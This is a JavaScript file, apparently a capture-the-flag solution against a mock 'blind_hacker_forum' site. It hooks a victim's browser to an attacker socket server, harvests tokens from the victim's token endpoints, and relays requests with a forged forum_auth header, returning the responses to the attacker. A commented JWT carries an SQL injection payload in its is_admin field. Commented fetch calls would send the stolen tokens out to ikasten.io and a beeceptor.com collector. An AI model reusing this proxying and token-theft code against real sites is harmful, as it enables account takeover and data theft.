const serverURL = window.location.hostname + ":" + window.location.port;

let indextoken = '';
let forumtoken = '';

// let forum_auth = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoieWVzJyBPUiAxPTIgLS0gIn0.0WYBrtbiVrVfOClqvBRpQKw2zNBfxFr346Iu9VchQcY";

let oldVictimURL = 'http://blind_hacker/';
let victimURL = 'http://blind_hacker_forum/';


window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (text_id) {

        // fetch("http://ikasten.io:3000/?"+text_id.text);
        const myHeaders = new Headers();
        myHeaders.set('content-type', text_id.contentType);
        myHeaders.set('forum_auth', text_id.text);


        fetch(victimURL + 'check?indextoken=' + indextoken + '&forumtoken=' + forumtoken, {
            method: 'GET',
            headers: myHeaders
            // body: text_id.text,
        }).then(res => {
            return res.text();
        }).
        then(data => {
            socket.emit('answer', {data: data, id: text_id.id});
        })
    })


    fetch(oldVictimURL + "token.php").
    then(res => res.text()).
    then(data => {

        //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
        indextoken = data.split(" ")[4];
        // console.log(token);
        // fetch("https://ikasten.free.beeceptor.com/" + data);
        return indextoken;
    }).
    then( token => {

        fetch( victimURL + 'token').
            then( res => res.text()).
            then( data => {
                forumtoken = data.split("-> ")[1]
                // fetch("https://ikasten.free.beeceptor.com/" + forumtoken);
        })
    })

};
